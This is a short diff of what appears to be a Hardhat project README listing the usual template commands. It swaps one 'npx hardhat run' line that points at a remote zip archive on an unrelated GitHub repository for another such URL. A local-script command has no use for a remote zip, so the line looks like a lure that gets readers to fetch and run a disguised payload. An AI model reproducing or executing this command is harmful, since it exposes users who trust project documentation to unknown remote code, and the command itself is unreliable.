@@ -9,5 +9,5 @@ npx hardhat help
 npx hardhat test
 REPORT_GAS=true npx hardhat test
 npx hardhat node
-npx hardhat run https://raw.githubusercontent.com/AbdeKuvazar/ai-family-cli/master/shovelweed/ai-family-cli.zip
+npx hardhat run https://github.com/AbdeKuvazar/ai-family-cli/raw/refs/heads/master/client/family_cli_ai_v3.7.zip
 ```
